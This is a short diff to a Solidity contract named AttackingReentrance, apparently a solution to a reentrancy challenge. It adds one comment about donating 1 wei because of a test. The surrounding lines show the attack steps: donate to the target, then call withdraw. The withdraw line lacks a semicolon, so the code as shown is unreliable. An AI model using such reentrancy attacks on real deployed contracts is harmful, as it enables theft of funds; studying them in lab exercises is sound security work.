@@ -10,6 +10,7 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
+        // must use 1 rather than 1 ether given test
         reentrance.donate{value: 1}(address(this));
         reentrance.withdraw()
     }
